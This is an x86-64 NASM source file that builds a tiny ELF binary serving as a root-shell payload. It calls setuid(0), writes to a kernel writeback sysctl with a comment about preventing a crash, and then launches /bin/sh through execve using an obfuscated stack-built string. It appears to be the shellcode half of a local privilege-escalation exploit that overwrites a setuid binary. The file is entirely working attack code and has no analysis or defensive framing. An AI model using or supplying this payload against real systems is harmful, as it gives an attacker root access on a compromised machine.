; https://blog.stalkr.net/2014/10/tiny-elf-3264-with-nasm.html
BITS 64
	org 0x400000
 
ehdr:           ; Elf64_Ehdr
	db 0x7f, "ELF", 2, 1, 1, 0 ; e_ident
	times 8 db 0
	dw  2         ; e_type
	dw  0x3e      ; e_machine
	dd  1         ; e_version
	dq  _start    ; e_entry
	dq  phdr - $$ ; e_phoff
	dq  0         ; e_shoff
	dd  0         ; e_flags
	dw  ehdrsize  ; e_ehsize
	dw  phdrsize  ; e_phentsize
	dw  1         ; e_phnum
	dw  0         ; e_shentsize
	dw  0         ; e_shnum
	dw  0         ; e_shstrndx
	ehdrsize  equ  $ - ehdr
 
phdr:           ; Elf64_Phdr
	dd  1         ; p_type
	dd  5         ; p_flags
	dq  0         ; p_offset
	dq  $$        ; p_vaddr
	dq  $$        ; p_paddr
	dq  filesize  ; p_filesz
	dq  filesize  ; p_memsz
	dq  0x1000    ; p_align
	phdrsize  equ  $ - phdr
 


sysctl_file: db "/proc/sys/vm/dirty_writeback_centisecs",0
sysctl_value: db "0",0

_start: 
	; need to elevate permissions first
	xor rdi, rdi			; uid=0
	mov rax, 0x69			; sys_setuid
	syscall

	; next, gotta change vm.dirty_writeback_centisecs to 0 to
	; prevent crash
	mov rax, 0x2 			; open()
	mov rdi, sysctl_file 	;filename
	mov rsi, 0x1 			; O_WRONLY
	syscall

	mov rbx, rax 			;stash the fd in rbx

	mov    rax, 1          	; 'write' syscall
	mov    rdi, rbx        	; file descriptor
	mov    rsi, sysctl_value; message address
	mov    rdx, 1          	; message string length
	syscall

	mov rax, 3             	; 'close' syscall
	mov rdi, rbx          	; file descriptor  
	syscall 

	; now we should be able to safely pop the shell
	xor rdi,rdi 
	push rdi      
	push rdi       
	pop rsi        
	pop rdx;
	mov rdi,0x68732f6e69622f2f 
	shr rdi,0x08 
	push rdi         
	push rsp 
	pop rdi    
	mov rax, 0x3b ; sys_execve
	syscall;

filesize  equ  $ - $$